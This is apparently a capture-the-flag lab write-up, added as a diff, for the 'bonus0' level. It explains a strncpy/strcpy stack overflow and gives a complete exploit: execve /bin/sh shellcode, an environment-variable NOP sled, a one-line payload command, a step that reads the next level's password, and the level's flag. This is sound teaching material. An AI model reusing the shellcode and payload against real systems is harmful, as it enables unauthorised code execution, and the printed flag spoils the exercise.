@@ -1,0 +1,161 @@
+Buffer Overflow via Missing Null Terminator - Bonus0
+======================================================
+
+Vulnerability Type: Buffer Overflow (strncpy + strcpy)
+Technique: Missing null terminator exploitation
+
+The strncpy() Vulnerability:
+----------------------------
+strncpy(dest, src, n) has a dangerous behavior:
+- If src has >= n characters, it copies EXACTLY n bytes
+- NO null terminator is added
+- dest becomes a non-null-terminated string
+- Any function expecting null-terminated string will overflow!
+
+Example:
+    char dest[20];
+    strncpy(dest, "12345678901234567890EXTRA", 20);
+    // dest = "12345678901234567890" (NO \0 at the end!)
+    // strlen(dest) will read past dest!
+    // strcpy(other, dest) will copy past dest!
+
+The Exploit Chain:
+------------------
+1. p() function reads 4096 bytes into big_buffer
+2. p() calls strncpy(dest, big_buffer, 20)
+3. If input >= 20 chars, dest has NO null terminator
+4. pp() calls strcpy(buff, str1)
+5. strcpy() looks for \0 but doesn't find it in str1
+6. strcpy() keeps copying: str1 → str2 → stack data → return address!
+
+Stack Layout in pp():
+---------------------
+Address (example)  | Content
+-------------------|----------------------------------
+0xbffff6d0         | str1[0-19]   (20 bytes)
+0xbffff6e4         | str2[0-19]   (20 bytes)
+0xbffff6f8         | Saved EBP    (4 bytes)
+0xbffff6fc         | Return addr  (4 bytes) ← TARGET!
+
+Overflow Path:
+--------------
+When strcpy(buff, str1) executes with no null in str1:
+
+Step 1: Copy str1 (20 bytes) to buff
+Step 2: No \0 found, keep copying
+Step 3: Copy str2 (20 bytes) to buff
+Step 4: No \0 found, keep copying
+Step 5: Copy saved EBP (4 bytes) to buff
+Step 6: Copy return address (4 bytes) to buff
+Step 7: Finally find \0 or crash
+
+Total copied: 20 + 20 + 4 + 4 = 48 bytes minimum
+
+Payload Construction:
+---------------------
+Goal: Overwrite return address with address of shellcode
+
+First Input (4095 bytes):
+- Purpose: Fill the 4096-byte buffer in p()
+- Content: Anything (we use 'A' * 4095)
+- Result: strncpy copies 20 bytes with NO null terminator
+
+Second Input (20 bytes):
+- Byte 0-8:   Padding ('B' * 9)
+- Byte 9-12:  Return address (0xbffff8a0)
+- Byte 13-19: Padding ('C' * 7)
+
+Why 9 bytes before return address?
+- str1: 20 bytes (no null)
+- str2: 20 bytes
+- strcpy copies str1 + str2 = 40 bytes
+- buff is at offset X
+- Return address is at offset X + 40 + saved_ebp
+- Through testing: offset 9 in str2 aligns with return address
+
+Shellcode Location:
+-------------------
+We use environment variable to store shellcode:
+
+export SHELLCODE=$(python -c 'print "\x90"*100 + shellcode')
+
+Environment variables are stored at high addresses (~0xbfffff00)
+We use NOP sled (\x90 * 100) to increase hit probability
+
+Return address: 0xbffff8a0
+- Points somewhere in the NOP sled
+- CPU slides down NOPs to shellcode
+- Shellcode executes /bin/sh
+
+Shellcode (23 bytes):
+---------------------
+\x31\xc0              xor eax, eax
+\x50                  push eax (NULL)
+\x68\x2f\x2f\x73\x68  push "//sh"
+\x68\x2f\x62\x69\x6e  push "/bin"
+\x89\xe3              mov ebx, esp ("/bin//sh")
+\x50                  push eax (NULL)
+\x53                  push ebx
+\x89\xe1              mov ecx, esp
+\xb0\x0b              mov al, 0x0b (execve)
+\xcd\x80              int 0x80
+
+Executes: execve("/bin//sh", ["/bin//sh", NULL], NULL)
+
+Complete Exploit:
+-----------------
+export SHELLCODE=$(python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"')
+
+(python -c "print 'A'*4095 + '\n' + 'B'*9 + '\xa0\xf8\xff\xbf' + 'C'*7"; cat) | ./bonus0
+
+Execution Flow:
+---------------
+1. Program starts, calls pp(buff)
+2. pp() calls p(str1, " - ")
+3. p() reads 4095 'A's, copies 20 to str1 (no null)
+4. pp() calls p(str2, " - ")
+5. p() reads "BBBBBBBBB\xa0\xf8\xff\xbfCCCCCCC", copies 20 to str2
+6. pp() calls strcpy(buff, str1)
+7. strcpy copies str1 (20) + str2 (20) + more
+8. Return address overwritten with 0xbffff8a0
+9. pp() returns
+10. CPU jumps to 0xbffff8a0 (NOP sled)
+11. CPU slides to shellcode
+12. Shellcode executes /bin/sh
+13. Shell runs as bonus1 user
+14. cat /home/user/bonus1/.pass
+
+Security Lessons:
+-----------------
+1. NEVER use strncpy without ensuring null termination:
+   strncpy(dest, src, n);
+   dest[n-1] = '\0';  // Always add this!
+
+2. Better: Use strlcpy (BSD) or snprintf:
+   strlcpy(dest, src, sizeof(dest));
+   snprintf(dest, sizeof(dest), "%s", src);
+
+3. Best: Use safe string libraries (C++ std::string, Rust String)
+
+4. Always validate string operations:
+   - Check for null terminators
+   - Verify buffer sizes
+   - Use static analysis tools
+
+5. Enable stack protections:
+   - Stack canaries (-fstack-protector-all)
+   - NX/DEP (non-executable stack)
+   - ASLR (address randomization)
+
+Common Mistakes:
+----------------
+1. Assuming strncpy always null-terminates (IT DOESN'T!)
+2. Using strlen() on non-null-terminated strings
+3. Using strcpy() with potentially non-null-terminated sources
+4. Not checking return values
+5. Trusting user input
+
+Flag:
+-----
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
